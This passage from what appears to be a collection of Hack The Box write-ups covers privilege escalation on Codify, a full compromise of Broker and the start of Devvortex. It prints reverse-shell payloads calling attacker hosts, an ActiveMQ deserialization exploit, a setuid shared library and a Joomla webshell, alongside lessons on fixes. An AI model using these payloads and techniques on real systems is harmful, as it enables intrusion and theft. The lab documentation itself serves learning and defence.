stabilization:</p>\n<pre><code class=\"language-bash\">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm\n</code></pre>\n<p>User <code>svc</code> (UID 1001) is the Node.js service account. No access to <code>user.txt</code> // lateral movement required.</p>\n<hr>\n<h2 id=\"lateral-movement-from-svc-to-joshua\">Lateral Movement // From svc to joshua</h2>\n<h3 id=\"enumeration-as-svc\">Enumeration as svc</h3>\n<pre><code class=\"language-bash\">svc@codify:/var/www/editor$ ls node_modules/ | grep vm2\nvm2\n</code></pre>\n<p>Confirmed vm2 library in the application directory.</p>\n<pre><code class=\"language-bash\">svc@codify:~$ find / -name &quot;*.db&quot; -readable 2&gt;/dev/null\n/var/www/contact/tickets.db\n</code></pre>\n<h3 id=\"credential-extraction-from-sqlite\">Credential extraction from SQLite</h3>\n<pre><code class=\"language-bash\">svc@codify:~$ sqlite3 /var/www/contact/tickets.db\nsqlite&gt; .tables\ntickets  users\nsqlite&gt; SELECT * FROM users;\n3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2\n</code></pre>\n<p>Bcrypt hash (<code>$2a$12$</code>) for user <strong>joshua</strong>.</p>\n<p><img alt=\"SQLite DB Browser // joshua's bcrypt hash from tickets.db\" src=\"img/guidbpassword.png\"></p>\n<h3 id=\"hash-cracking\">Hash cracking</h3>\n<pre><code class=\"language-bash\"># Transfer hash to attacker machine\necho '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' &gt; hash.txt\n\n# Crack with hashcat (mode 3200 = bcrypt)\nhashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre>\n<pre><code>$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1\n</code></pre>\n<h3 id=\"ssh-as-joshua\">SSH as joshua</h3>\n<pre><code class=\"language-bash\">ssh joshua@codify.htb\n# Password: spongebob1\n</code></pre>\n<p><strong>User flag:</strong> obtained.</p>\n<hr>\n<h2 id=\"privilege-escalation-bash-glob-injection-process-snooping\">Privilege Escalation // Bash Glob Injection + Process Snooping</h2>\n<h3 id=\"sudo-l\">sudo -l</h3>\n<pre><code class=\"language-bash\">joshua@codify:~$ sudo -l\nUser joshua may run the following commands on codify:\n    (root) /opt/scripts/mysql-backup.sh\n</code></pre>\n<h3 id=\"script-analysis\">Script analysis</h3>\n<pre><code class=\"language-bash\">joshua@codify:~$ cat /opt/scripts/mysql-backup.sh\n</code></pre>\n<pre><code class=\"language-bash\">#!/bin/bash\nDB_USER='root'\nDB_PASS=$(/usr/bin/cat /root/.creds)\n# ...\nread -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS\n\nif  $USER_PASS == $DB_PASS ; then\n    /usr/bin/mysqldump ... -u &quot;$DB_USER&quot; -p&quot;$DB_PASS&quot; ...\nelse\n    echo &quot;Access denied.&quot;\nfi\n</code></pre>\n<blockquote>\n<p><strong>Vulnerability // two vectors</strong>  </p>\n<p><strong>1. Bash glob injection</strong>: the comparison <code>$USER_PASS == $DB_PASS</code> uses <code>$DB_PASS</code> without quoting. Inside <code></code>, the unquoted right-hand side is treated as a <strong>glob pattern</strong>. The <code>*</code> character matches any string. Entering <code>*</code> as the password makes the comparison always evaluate to true.</p>\n<p><strong>2. Process snooping</strong>: if the comparison succeeds, the script runs <code>mysqldump -p\"$DB_PASS\"</code> with the real password as a process argument. Tools like <code>pspy</code> monitor <code>/proc</code> via <code>inotify</code> and read the <code>cmdline</code> of every new process, capturing the password <strong>in cleartext</strong> before the process terminates.</p>\n<p>For countermeasures see Process Hardening (<code>hidepid</code>, argv masking).</p>\n</blockquote>\n<h3 id=\"approach-1-glob-bypass-pspy-fastest\">Approach 1 // Glob bypass + pspy (fastest)</h3>\n<pre><code class=\"language-bash\"># Terminal 1 // process monitoring\njoshua@codify:~$ ./pspy32\n</code></pre>\n<pre><code class=\"language-bash\"># Terminal 2 // run the script\njoshua@codify:~$ sudo /opt/scripts/mysql-backup.sh\nEnter MySQL password for root: *\n</code></pre>\n<p>The <code>*</code> bypasses the comparison. The script proceeds and launches <code>mysqldump</code> with the real password. pspy output:</p>\n<pre><code>CMD: UID=0 /usr/bin/mysqldump ... -u root -p&lt;REDACTED&gt; ...\n</code></pre>\n<p><img alt=\"pspy32 output // root password leaked in process arguments\" src=\"img/pspy32pwd.png\"></p>\n<p>Root password captured in cleartext.</p>\n<h3 id=\"approach-2-character-by-character-brute-force\">Approach 2 // Character-by-character brute-force</h3>\n<p>If pspy is unavailable, the password can be extracted one character at a time using the same glob trick:</p>\n<pre><code class=\"language-bash\">#!/bin/bash\n# brute-privesc.sh //glob brute-force\ncharset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\npassword=''\n\necho &quot;[*] Brute-forcing password via glob injection...&quot;\n\nwhile true; do\n    found=0\n    for (( i=0; i&lt;${#charset}; i++ )); do\n        c=&quot;${charset:$i:1}&quot;\n        attempt=&quot;${password}${c}*&quot;\n        if echo &quot;$attempt&quot; | sudo /opt/scripts/mysql-backup.sh 2&gt;/dev/null | grep -q &quot;successfully&quot;; then\n            password=&quot;${password}${c}&quot;\n            echo &quot;[+] Found: $password&quot;\n            found=1\n            break\n        fi\n    done\n    if  $found -eq 0 ; then\n        echo &quot;[*] Complete password: $password&quot;\n        break\n    fi\ndone\n</code></pre>\n<p><code>a*</code> fails. <code>k*</code> succeeds (first character). <code>kl*</code> succeeds. And so on until the full password is reconstructed.</p>\n<h3 id=\"root-shell\">Root shell</h3>\n<pre><code class=\"language-bash\">joshua@codify:~$ su root\nPassword: &lt;REDACTED&gt;\nroot@codify:~# cat /root/root.txt\n</code></pre>\n<p><strong>Root flag:</strong> obtained.</p>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<pre><code>Nmap → 3 open ports, Node.js Express on 3000\n       ↓\n  Web app uses vm2 3.9.16 → CVE-2023-30547 sandbox escape → RCE\n       ↓\n  Reverse shell → svc\n       ↓\n  /var/www/contact/tickets.db → joshua's bcrypt hash\n       ↓\n  hashcat -m 3200 → spongebob1 → SSH as joshua → user.txt\n       ↓\n  sudo -l → /opt/scripts/mysql-backup.sh\n       ↓\n  Bash glob injection (*) + pspy → root password in cleartext\n       ↓\n  su root → root.txt\n</code></pre>\n<h2 id=\"flags\">Flags</h2>\n<ul>\n<li><strong>User:</strong> obtained (as joshua via SSH)</li>\n<li><strong>Root:</strong> obtained (as root via su)</li>\n</ul>\n<h2 id=\"lessons-learned\">Lessons Learned</h2>\n<ul>\n<li><strong>vm2 sandbox escape (CVE-2023-30547):</strong> The vm2 library was deprecated after a series of unfixable sandbox escapes. Never use vm2 to run untrusted code in production //use <code>isolated-vm</code> (V8 isolates) or Docker containers with seccomp instead.</li>\n<li><strong>Bash <code></code> and glob patterns:</strong> The comparison <code>$a == $b</code> without quoting the right-hand side interprets <code>$b</code> as a glob pattern. The fix is trivial: <code>\"$a\" == \"$b\"</code>. Always quote variables in bash comparisons.</li>\n<li><strong>Passwords as process arguments:</strong> <code>mysqldump -p\"password\"</code> exposes the password in <code>/proc/PID/cmdline</code>. Any local user can read it with <code>ps -ef</code> or <code>pspy</code>. The solution is to use configuration files (<code>~/.my.cnf</code>) or environment variables, and enable <code>hidepid=2</code> on <code>/proc</code>. See Process Hardening.</li>\n<li><strong>Lateral movement via local databases:</strong> Unprotected SQLite databases in web application directories are a frequent source of credentials. Always search for <code>*.db</code>, <code>*.sqlite</code>, <code>*.sqlite3</code> during enumeration.</li>\n</ul>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><strong>Total time:</strong> ~3h</li>\n<li><strong>Where I spent the most time:</strong> Privesc //analyzing the script and experimenting with pspy to intercept the password</li>\n<li><strong>Subjective difficulty:</strong> 4/10</li>\n</ul>"
    },
    {
      "title": "Broker",
      "slug": "broker",
      "date": "2026·03·05",
      "tags": [
        "htb",
        "easy",
        "linux",
        "activemq",
        "cve-2023-46604",
        "deserialization"
      ],
      "desc": "See also: WebServices",
      "body": "<h1 id=\"broker-hack-the-box\">Broker // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux (Ubuntu)</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.230.87</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>broker.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), HTTP/nginx (80), ActiveMQ (61616)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<blockquote>\n<p>See also: WebServices</p>\n</blockquote>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA nmap.scan broker.htb\n</code></pre>\n<pre><code>PORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4\n80/tcp    open  http       nginx 1.18.0 (Ubuntu)\n|_http-title: Error 401 Unauthorized\n| http-auth: HTTP/1.1 401 Unauthorized\n|_  basic realm=ActiveMQRealm\n1883/tcp  open  mqtt\n5672/tcp  open  amqp?\n8161/tcp  open  http       Jetty 9.4.39.v20210325\n| http-auth: HTTP/1.1 401 Unauthorized\n|_  basic realm=ActiveMQRealm\n43203/tcp open  tcpwrapped\n61613/tcp open  stomp      Apache ActiveMQ\n61614/tcp open  http       Jetty 9.4.39.v20210325\n61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15\n</code></pre>\n<p>Open ports:\n- <strong>22/tcp</strong> — OpenSSH 8.9p1 Ubuntu → SSH\n- <strong>80/tcp</strong> — nginx 1.18.0, reverse proxy to ActiveMQ web console, requires Basic auth (<code>ActiveMQRealm</code>)\n- <strong>1883/tcp</strong> — MQTT (message broker protocol)\n- <strong>5672/tcp</strong> — AMQP (message broker protocol)\n- <strong>8161/tcp</strong> — Jetty 9.4.39, ActiveMQ web console, same Basic auth\n- <strong>61613/tcp</strong> — STOMP (messaging protocol)\n- <strong>61614/tcp</strong> — Jetty 9.4.39, ActiveMQ REST API\n- <strong>61616/tcp</strong> — <strong>ActiveMQ OpenWire transport 5.15.15</strong> — attack vector</p>\n<pre><code class=\"language-bash\">sudo tee -a /etc/hosts &lt;&lt;&lt; &quot;10.129.230.87  Broker.htb&quot;\n</code></pre>\n<h3 id=\"web-enumeration\">Web Enumeration</h3>\n<p>Both HTTP services (ports 80 and 8161) respond with <code>401 Unauthorized</code> and require Basic authentication on the realm <code>ActiveMQRealm</code>. No content is accessible without credentials.</p>\n<p>The critical service is <strong>ActiveMQ OpenWire</strong> on port <strong>61616</strong>, which exposes version <strong>5.15.15</strong> — a version known to be vulnerable.</p>\n<hr>\n<h2 id=\"foothold-cve-2023-46604-activemq-openwire-rce\">Foothold // CVE-2023-46604 (ActiveMQ OpenWire RCE)</h2>\n<blockquote>\n<p>Deep dive: WebServices</p>\n<p><strong>Vulnerability</strong><br>\n<strong>Apache ActiveMQ &lt; 5.15.16 / &lt; 5.16.7 / &lt; 5.17.6</strong> — The OpenWire protocol deserializes messages without validation. An attacker can send a packet containing the <code>ClassPathXmlApplicationContext</code> class that forces the server to load a remote Spring XML file, executing arbitrary commands as the service user. <strong>Pre-auth, CVSS 10.0.</strong></p>\n<p>Ref: https://nvd.nist.gov/vuln/detail/CVE-2023-46604\nPoC: https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ</p>\n</blockquote>\n<h3 id=\"payload-preparation\">Payload Preparation</h3>\n<p>The XML file contains a Spring Bean that executes a bash reverse shell:</p>\n<pre><code class=\"language-xml\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;\n   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n   xsi:schemaLocation=&quot;\n http://www.springframework.org/schema/beans\n http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;\n    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;\n        &lt;constructor-arg&gt;\n        &lt;list&gt;\n            &lt;value&gt;bash&lt;/value&gt;\n            &lt;value&gt;-c&lt;/value&gt;\n            &lt;value&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.96/1001 0&amp;gt;&amp;amp;1&lt;/value&gt;\n        &lt;/list&gt;\n        &lt;/constructor-arg&gt;\n    &lt;/bean&gt;\n&lt;/beans&gt;\n</code></pre>\n<h3 id=\"exploitation\">Exploitation</h3>\n<pre><code class=\"language-bash\"># Terminal 1 - HTTP server to serve the XML\npython3 -m http.server 2002\n\n# Terminal 2 - Listener for the reverse shell\nnc -nvlp 1001\n</code></pre>\n<pre><code class=\"language-bash\"># Terminal 3 - Launch exploit\npython3 main.py -i 10.129.230.87 -p 61616 -u http://10.10.14.96:2002/poc-linux.xml\n</code></pre>\n<p>The PoC sends an OpenWire packet containing the <code>ClassPathXmlApplicationContext</code> class with the URL of the remote XML. ActiveMQ deserializes it, loads the XML, instantiates the <code>ProcessBuilder</code> Bean, and executes the command.</p>\n<h3 id=\"reverse-shell\">Reverse shell</h3>\n<pre><code>connect to [10.10.14.96] from (UNKNOWN) [10.129.230.87] 35808\nbash: no job control in this shell\nactivemq@broker:/opt/apache-activemq-5.15.15/bin$ whoami\nactivemq\n</code></pre>\n<p><strong>User flag</strong> in <code>/home/activemq/user.txt</code>:</p>\n<pre><code class=\"language-bash\">activemq@broker:~$ cat user.txt\n934ecc9941a7f7fe4540b4269d5d57ce\n\n## Privilege Escalation // sudo nginx (shared library hijack)\n\n&gt; Methodology: PrivilegeEscalation and [GTFOBins - nginx](https://gtfobins.org/gtfobins/nginx/)\n\n### sudo -l\n\n```bash\nactivemq@broker:~$ sudo -l\nMatching Defaults entries for activemq on broker:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser activemq may run the following commands on broker:\n    (ALL : ALL) NOPASSWD: /usr/sbin/nginx\n</code></pre>\n<p>The user <code>activemq</code> can run <code>nginx</code> as root without a password.</p>\n<h3 id=\"approach-1-filesystem-readwrite-evil-config\">Approach 1 // Filesystem read/write (evil config)</h3>\n<p>Create a malicious nginx config file that runs nginx as root with access to the entire filesystem:</p>\n<pre><code class=\"language-nginx\">user root;\nhttp {\n  server {\n    listen 9999;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\n</code></pre>\n<pre><code class=\"language-bash\"># Transfer to target machine\nwget http://10.10.14.96:2002/evil -O /tmp/evil\n\n# Start nginx with the malicious config\nsudo nginx -c /tmp/evil\n</code></pre>\n<p>This exposes the entire filesystem for reading (<code>autoindex</code>) and writing (WebDAV <code>PUT</code>) on port 9999 as root. Useful for reading <code>/root/root.txt</code> or writing SSH keys to <code>/root/.ssh/authorized_keys</code>.</p>\n<h3 id=\"approach-2-root-shell-via-load_module\">Approach 2 // Root shell via load_module</h3>\n<blockquote>\n<p><strong>GTFOBins — nginx load_module</strong><br>\nThe nginx page on GTFOBins shows how to load a malicious shared library via <code>load_module</code>. However <strong>GTFOBins has a syntax error</strong>: it is missing the final <code>;</code>. The correct directive is:</p>\n<p><code>load_module /path/to/lib.so;</code></p>\n<p>Without the semicolon, nginx returns:\n<code>nginx: [emerg] unexpected end of file, expecting \";\" or \"}\"</code></p>\n<p>Ref: https://gtfobins.org/gtfobins/nginx/</p>\n</blockquote>\n<h4 id=\"step-1-compiling-the-malicious-shared-library\">Step 1 // Compiling the malicious shared library</h4>\n<pre><code class=\"language-c\">// shell.c\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid _init() {\n    unsetenv(&quot;LD_PRELOAD&quot;);\n    setgid(0);\n    setuid(0);\n    system(&quot;/bin/bash&quot;);\n}\n</code></pre>\n<pre><code class=\"language-bash\">gcc -fPIC -shared -o shell.so shell.c -nostartfiles\n</code></pre>\n<h4 id=\"step-2-transfer-to-target-machine\">Step 2 // Transfer to target machine</h4>\n<blockquote>\n<p>See also: FileTransfer</p>\n</blockquote>\n<pre><code class=\"language-bash\"># Attacker - HTTP server\npython3 -m http.server 2002\n\n# Target - download\nwget http://10.10.14.96:2002/shell.so -O /tmp/shell.so\n</code></pre>\n<h4 id=\"step-3-creating-config-and-root-shell\">Step 3 // Creating config and root shell</h4>\n<pre><code class=\"language-bash\">echo -n &quot;load_module /tmp/shell.so;&quot; &gt; /tmp/eraquesto\n</code></pre>\n<pre><code class=\"language-bash\">activemq@broker:/tmp$ sudo nginx -t -c /tmp/eraquesto\n# whoami\nroot\n</code></pre>\n<p>When nginx loads the <code>.so</code> module, it executes the <code>_init()</code> function which calls <code>setuid(0)</code> + <code>system(\"/bin/bash\")</code>, obtaining a root shell.</p>\n<p><strong>Root flag</strong> in <code>/root/root.txt</code>.</p>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<p>```\nNmap → 9 open ports, ActiveMQ 5.15.15 on 61616\n       ↓\n  CVE-2023-46604 (OpenWire deserialization) → Spring XML RCE\n       ↓\n  Reverse shell → activemq → user.txt\n       ↓\n  sudo -l → (ALL:ALL) NOPASSWD: /usr/sbin/nginx\n       ↓\n  Approach 1: evil nginx config (root /, autoindex, WebDAV PUT)\n  Approach 2: load_module /tmp/shell.so; → root shell</p>\n<h2 id=\"flags\">Flags</h2>\n<ul>\n<li><strong>User:</strong> <code>934ecc9941a7f7fe4540b4269d5d57ce</code></li>\n<li><strong>Root:</strong> (readable via <code>curl http://localhost:9999/root/root.txt</code> or from the root shell)</li>\n</ul>\n<h2 id=\"lessons-learned\">Lessons Learned</h2>\n<ul>\n<li><strong>CVE-2023-46604 (ActiveMQ):</strong> Critical vulnerability (CVSS 10.0) allowing pre-auth RCE via deserialization in the OpenWire protocol. The service must never be exposed without patching. The fixed version is &gt;= 5.15.16 / 5.16.7 / 5.17.6.</li>\n<li><strong>nginx sudo without restrictions:</strong> <code>sudo nginx</code> is equivalent to full root. Nginx can read/write any file (config with <code>root /</code>) and load arbitrary modules (<code>load_module</code>). Never grant sudo on nginx without AppArmor or severe restrictions.</li>\n<li><strong>GTFOBins bug:</strong> The nginx page on GTFOBins omits the <code>;</code> in the <code>load_module</code> directive. Nginx syntax requires the terminator: <code>load_module /path/to/lib.so;</code></li>\n<li><strong>Operational lesson:</strong> In a reverse shell without TTY, multiline commands and editing are difficult. Better to prepare files on the attacker and transfer them with <code>wget</code> rather than trying to create them with <code>echo</code>/<code>cat</code> in the raw shell.</li>\n</ul>"
    },
    {
      "title": "Devvortex",
      "slug": "devvortex",
      "date": "2026·03·04",
      "tags": [
        "htb",
        "easy",
        "linux",
        "joomla",
        "cve-2023-23752",
        "api-information-disclosure"
      ],
      "desc": "Open ports: - 22/tcp — OpenSSH 8.2p1 Ubuntu - 80/tcp — Nginx 1.18.0 → redirect to http://devvortex.htb/",
      "body": "<h1 id=\"devvortex-hack-the-box\">Devvortex // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux (Ubuntu 20.04.6 LTS)</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>devvortex.htb / dev.devvortex.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), HTTP/Nginx (80)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA nmap.scan &lt;TARGET_IP&gt;\n</code></pre>\n<pre><code class=\"language-text\">PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://devvortex.htb/\n</code></pre>\n<p>Open ports:\n- <strong>22/tcp</strong> — OpenSSH 8.2p1 Ubuntu\n- <strong>80/tcp</strong> — Nginx 1.18.0 → redirect to <code>http://devvortex.htb/</code></p>\n<h3 id=\"directory-bruteforce-main-site\">Directory Bruteforce // Main Site</h3>\n<pre><code class=\"language-bash\">ffuf -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -o scan/ffuf-dirs.json -of json\n</code></pre>\n<p>Nothing relevant — static site with HTML pages (<code>about.html</code>, <code>contact.html</code>, <code>do.html</code>).</p>\n<h3 id=\"vhost-enumeration-the-key\">VHost Enumeration // The Key</h3>\n<blockquote>\n<p><strong>Subdomain Fuzzing vs VHost Fuzzing</strong><br>\nThese are <strong>two different techniques</strong> that solve different problems:</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Subdomain Fuzzing (DNS)</th>\n<th>VHost Fuzzing (HTTP)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>How it works</strong></td>\n<td>Queries a DNS server to find A/CNAME records of subdomains (<code>dig</code>, <code>subfinder</code>, <code>amass</code>, <code>dnsrecon</code>)</td>\n<td>Sends HTTP requests to the same IP while varying the <code>Host:</code> header (<code>ffuf -H \"Host: FUZZ.domain\"</code>)</td>\n</tr>\n<tr>\n<td><strong>What's needed</strong></td>\n<td>A DNS server that responds for the target domain</td>\n<td>A web server that uses virtual hosting (routing based on Host header)</td>\n</tr>\n<tr>\n<td><strong>When it works</strong></td>\n<td>When the target has a real DNS server with configured records</td>\n<td>When the web server (Nginx, Apache) has multiple server blocks/vhosts on the same IP</td>\n</tr>\n<tr>\n<td><strong>In HTB</strong></td>\n<td><strong>Does not work</strong> — there is no real DNS server, we use <code>/etc/hosts</code></td>\n<td><strong>Works</strong> — Nginx routes requests to the correct vhost based on the <code>Host</code> header</td>\n</tr>\n</tbody>\n</table>\n<p>On this machine, <code>dev.devvortex.htb</code> <strong>cannot</strong> be discovered via DNS. It is an <strong>Nginx virtual host</strong>: same IP, same server, but different content depending on the <code>Host</code> header. The only way to find it is VHost fuzzing.</p>\n</blockquote>\n<pre><code class=\"language-bash\">ffuf -H &quot;Host: FUZZ.devvortex.htb&quot; -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devvortex.htb/ -fs &lt;baseline_size&gt;\n</code></pre>\n<p>Found: <strong>dev.devvortex.htb</strong></p>\n<h3 id=\"directory-bruteforce-devdevvortexhtb\">Directory Bruteforce // dev.devvortex.htb</h3>\n<pre><code class=\"language-bash\">dirsearch -u http://dev.devvortex.htb/ -e php,html,txt,js,json,xml,bak,old,asp,aspx -o scan/dirsearch.txt\n</code></pre>\n<p>Relevant results:\n- <code>/administrator/</code> → Joomla admin panel (12KB)\n- <code>/api/</code> → Joomla API endpoint</p>\n<p>The admin panel confirms: <strong>Joomla CMS</strong>.</p>\n<hr>\n<h2 id=\"foothold-cve-2023-23752-joomla-api-information-disclosure\">Foothold // CVE-2023-23752 (Joomla API Information Disclosure)</h2>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>Joomla 4.0.0 - 4.2.7</strong> — The Joomla REST API exposes endpoints that should require authentication, but the <code>public=true</code> parameter bypasses the checks. This allows an unauthenticated attacker to read the application configuration (including DB credentials) and the list of users.</p>\n<p>Ref: https://nvd.nist.gov/vuln/detail/CVE-2023-23752</p>\n</blockquote>\n<h3 id=\"user-enumeration\">User Enumeration</h3>\n<pre><code class=\"language-text\">GET /api/index.php/v1/users?public=true\n</code></pre>\n<pre><code class=\"language-json\">{\n  &quot;data&quot;: [\n    {&quot;id&quot;: 649, &quot;username&quot;: &quot;lewis&quot;, &quot;email&quot;: &quot;lewis@devvortex.htb&quot;, &quot;group_names&quot;: &quot;Super Users&quot;},\n    {&quot;id&quot;: 650, &quot;username&quot;: &quot;logan&quot;, &quot;email&quot;: &quot;logan@devvortex.htb&quot;, &quot;group_names&quot;: &quot;Registered&quot;}\n  ]\n}\n</code></pre>\n<h3 id=\"configuration-leak\">Configuration Leak</h3>\n<pre><code class=\"language-text\">GET /api/index.php/v1/config/application?public=true\n</code></pre>\n<p>DB credentials found:</p>\n<table>\n<thead>\n<tr>\n<th>Field</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>DB User</td>\n<td><code>lewis</code></td>\n</tr>\n<tr>\n<td>DB Pass</td>\n<td><code>P4ntherg0t1n5r3c0n##</code></td>\n</tr>\n<tr>\n<td>DB Name</td>\n<td><code>joomla</code></td>\n</tr>\n<tr>\n<td>DB Prefix</td>\n<td><code>sd4fg_</code></td>\n</tr>\n<tr>\n<td>DB Host</td>\n<td><code>localhost</code></td>\n</tr>\n</tbody>\n</table>\n<p><strong>Root cause:</strong> The database password is the same as the Joomla admin user <code>lewis</code>.</p>\n<h3 id=\"admin-login-webshell-upload\">Admin Login + Webshell Upload</h3>\n<p>Login to <code>/administrator/</code> with <code>lewis</code> / <code>P4ntherg0t1n5r3c0n##</code> — access as <strong>Super User</strong>.</p>\n<p>Upload of a malicious webshell plugin (<a href=\"https://github.com/p0dalirius/Joomla-webshell-plugin\">p0dalirius/Joomla-webshell-plugin</a>):</p>\n<pre><code class=\"language-bash\">curl -X POST 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php' --data &quot;action=exec&amp;cmd=id&quot;\n</code></pre>\n<pre><code class=\"language-json\">{&quot;stdout&quot;:&quot;uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n&quot;,&quot;stderr&quot;:&quot;&quot;,&quot;exec&quot;:&quot;id&quot;}\n</code></pre>\n<h3 id=\"reverse-shell\">Reverse Shell</h3>\n<p>Try various reverse shells — the system uses <strong>sh</strong> (not bash) and <strong>OpenBSD netcat</strong> (without <code>-c</code>/<code>-e</code>):</p>\n<table>\n<thead>\n<tr>\n<th>Payload</th>\n<th>Result</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>bash -i &gt;&amp; /dev/tcp/...</code></td>\n<td><code>Syntax error</code> — sh does not support <code>/dev/tcp</code></td>\n</tr>\n<tr>\n<td><code>nc -c /bin/bash</code></td>\n<td><code>invalid option -- 'c'</code> — OpenBSD nc</td>\n</tr>\n<tr>\n<td><code>nc -e /bin/bash</code></td>\n<td><code>invalid option -- 'e'</code> — OpenBSD nc</td>\n</tr>\n<tr>\n<td><code>rm /tmp/f;mkfifo...</code></td>\n<td><code>Syntax error</code> — URL encoding broken on <code>&gt;&amp;</code></td>\n</tr>\n</tbody>\n</table>\n<p>Checked if <strong>BusyBox</strong> is available (it has a netcat with <code>-e</code>):</p>\n<pre><code class=\"language-bash\">curl -X POST '...' --data &quot;action=exec&amp;cmd=busybox&quot;\n# → BusyBox v1.30.1 // nc present with -e support!\n</code></pre>\n<p><strong>Working Payload:</strong></p>\n<pre><code class=\"language-bash\"># Listener (attacker):\nnc -nvlp 443\n\n# Via webshell:\ncurl -X POST 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php' \\\n  --data &quot;action=exec&amp;cmd=busybox nc &lt;ATTACKER_IP&gt; 443 -e /bin/bash&quot;\n</code></pre>\n<blockquote>\n<p><strong>busybox nc</strong><br>\nWhen the system <code>nc</code> is the OpenBSD version (no <code>-c</code>/<code>-e</code>), always check <code>busybox</code>. The BusyBox version of netcat supports <code>-e</code> for shell exec — it's a reliable fallback already present on many Ubuntu/Debian systems.</p>\n</blockquote>\n<h3 id=\"shell-stabilization\">Shell Stabilization</h3>\n<pre><code class=\"language-bash\">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'\nexport TERM=xterm\n# Ctrl+Z\nstty raw -echo; fg\nstty rows 38 columns 116\n</code></pre>\n<hr>\n<h2 id=\"user-logan\">User // logan</h2>\n<h3 id=\"enumeration-as-www-data\">Enumeration as www-data</h3>\n<pre><code class=\"language-bash\">cat /etc/passwd | grep bash\n# root:x:0:0:root:/root:/bin/bash\n# logan:x:1000:1000:,,,:/home/logan:/bin/bash\n\ncat /home/logan/user.txt\n# Permission denied // user.txt readable only by logan\n\ncat /var/www/dev.devvortex.htb/configuration.php\n# Confirms DB credentials\n</code></pre>\n<h3 id=\"mysql-dump-hash\">MySQL // Dump Hash</h3>\n<pre><code class=\"language-bash\">mysql -u lewis -p\n# Password: P4ntherg0t1n5r3c0n##\n</code></pre>\n<pre><code class=\"language-sql\">use joomla;\nselect * from sd4fg_users;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Username</th>\n<th>Hash</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>lewis</td>\n<td><code>$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u</code></td>\n</tr>\n<tr>\n<td>logan</td>\n<td><code>$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12</code></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"hashcat-crack-bcrypt\">hashcat // Crack bcrypt</h3>\n<pre><code 